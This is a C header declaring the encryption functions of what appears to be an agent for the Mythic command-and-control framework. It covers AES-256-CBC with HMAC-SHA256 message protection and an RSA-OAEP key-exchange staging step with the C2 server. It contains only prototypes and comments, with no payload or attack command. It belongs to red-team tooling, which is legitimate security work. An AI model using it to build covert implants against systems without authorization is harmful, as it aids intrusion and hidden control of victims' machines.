#ifndef CRYPTO_H
#define CRYPTO_H

#include "agent.h"
#include <stddef.h>

#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)

// Encrypt plaintext using AES-256-CBC + HMAC-SHA256.
// Output format: IV[16] + ciphertext[padded] + HMAC-SHA256(key, IV+ciphertext)[32]
// Caller prepends the UUID before base64-encoding the full wire message.
// Returns 0 on success; *out is caller-freed.
int crypto_encrypt(const unsigned char *key,
                   const unsigned char *plain, size_t plain_len,
                   unsigned char **out, size_t *out_len);

// Decrypt a message produced by crypto_encrypt.
// in layout: IV[16] + ciphertext[padded] + HMAC[32]
// Verifies HMAC (over IV + ciphertext) before decrypting.
// Returns 0 on success; *out is NUL-terminated and caller-freed.
int crypto_decrypt(const unsigned char *key,
                   const unsigned char *in, size_t in_len,
                   unsigned char **out, size_t *out_len);

#endif // ENCRYPTION_STATIC_KEY || ENCRYPTION_EKE

#ifdef ENCRYPTION_EKE

// Perform RSA-OAEP key exchange with the Mythic server.
// Sends a staging message and receives the real UUID + permanent session key.
// Updates agent->uuid and agent->session_key in-place.
// Returns 0 on success.
int crypto_eke_stage(Agent *agent);

#endif // ENCRYPTION_EKE

#endif // !CRYPTO_H
